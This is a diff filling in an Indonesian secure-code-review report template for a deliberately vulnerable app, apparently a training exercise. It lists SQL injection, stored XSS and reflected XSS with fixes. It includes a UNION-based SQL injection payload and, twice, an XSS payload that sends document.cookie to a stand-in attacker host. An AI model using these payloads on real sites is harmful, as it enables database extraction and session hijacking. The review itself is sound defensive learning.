@@ -1,35 +1,30 @@
-# Secure Code Review - <Nama Peserta>
+# Secure Code Review - Yeremia Juan
 Project: vulnerable.js
-Tanggal: YYYY-MM-DD
+Tanggal: 2025-11-07
 
 ## Summary (1–2 kalimat)
-Ringkasan temuan dan prioritas (mis. "Ditemukan 5 issue, 2 high, 2 medium, 1 low").
+Ditemukan 3 vulnerability HIGH RISK yang harus segera dipatch
 
-## Findings (minimum 5)
+## Findings (minimum 3)
 1. **Issue:** SQL Injection  
-   **Location:** /search handler (baris XX)  
-   **Risk:** High — attacker bisa manipulasi query dan mengeksekusi query arbitrary.  
-   **Recommendation:** Gunakan parameterized query / prepared statements. Contoh: `db.get("SELECT ... WHERE name LIKE ?", ['%'+q+'%'])`.
+   **Location:** /search handler (baris 77)  
+   **Risk:** High — attacker bisa manipulasi query dan mengeksekusi query arbitrary. 
+   Dengan memasukan ' UNION SELECT 1,sqlite_version(),name FROM sqlite_master WHERE type='table' -- ke dalam search, List kolom dan version sqlite berhasil didapatkan dari tabel
+   Ini karena query tidak di parameterized sehingga memungkinkan injeksi SQL
+   **Recommendation:** Untuk memperbaiki, gunakan prepared statement atau parameterized query
+   contoh: const sql = `SELECT id, title, content FROM posts WHERE title LIKE ? OR content LIKE ?`;
+   const params = [`%${q}%`, `%${q}%`];
+   db.all(sql, params, (err, rows) => { ... });
 
 2. **Issue:** Stored XSS  
-   **Location:** /comments render (baris XX)  
-   **Risk:** High — payload tersimpan dan dieksekusi pada pengunjung.  
-   **Recommendation:** Encode on output atau gunakan sanitizer (DOMPurify) sebelum render.
+   **Location:** /comments render (baris 125)  
+   **Risk:** High — Input pengguna disimpan dalam database tanpa sanitasi dan kemudian ditampilkan langsung    dalam HTML. Ini memungkinkan penyerang untuk menyisipkan skrip berbahaya yang akan dieksekusi di browser pengguna lain yang melihat komentar tersebut. contoh payload: <script>alert('XSS')</script>, <img src="https://www.google.com/images/branding/googlelogo/1x/googlelogo_color_272x92dp.png" onerror="this.src='https://attacker-server.com/steal?c='+document.cookie">
+   **Recommendation:** Untuk memperbaiki, lakukan sanitasi pada input sebelum menyimpannya ke database atau lakukan encoding pada output. Contoh penggunaan fungsi escapeHtml: ${escapeHtml(r.body)}   
 
-3. **Issue:** IDOR / Broken Access Control  
-   **Location:** /product/:id (baris XX)  
-   **Risk:** High — resource diakses tanpa authorization check.  
-   **Recommendation:** Periksa ownership/permissions sebelum return resource.
-
-4. **Issue:** Reflected XSS  
-   **Location:** /reflect (baris XX)  
-   **Risk:** Medium — input langsung direfleksikan ke page.  
-   **Recommendation:** Escape output dan validasi input.
-
-5. **Issue:** DOM-based XSS (client)  
-   **Location:** /dom (script block)  
-   **Risk:** Medium — penggunaan innerHTML dengan data dari location.hash.  
-   **Recommendation:** Gunakan textContent / safe DOM APIs.
+3. **Issue:** Reflected XSS
+   **Location:** /reflect render (baris 163)  
+   **Risk:** High — Input pengguna dari parameter query "msg" disisipkan langsung ke dalam respons HTML tanpa sanitasi. Mirip seperti stored XSS, ini memungkinkan penyerang untuk menyisipkan skrip berbahaya yang akan dieksekusi di browser pengguna yang mengunjungi URL tersebut.  contoh payload: <script>alert('XSS')</script>, <img src="https://www.google.com/images/branding/googlelogo/1x/googlelogo_color_272x92dp.png" onerror="this.src='https://attacker-server.com/steal?c='+document.cookie">
+   **Recommendation:**  Untuk memperbaiki, lakukan sanitasi pada input sebelum menyisipkannya ke dalam HTML atau lakukan encoding pada output. Contoh penggunaan fungsi escapeHtml: ${escapeHtml(msg)}, terutama pada bagian yang rentan seperti di bawah ini: <p>Server echoed (vulnerable): ${escapeHtml(msg)}</p> <!-- vulnerable: msg not escaped here
 
 ## Verification / How I tested
 - Contoh request/URL yang saya pakai untuk reproduce (screen capture disertakan jika ada).
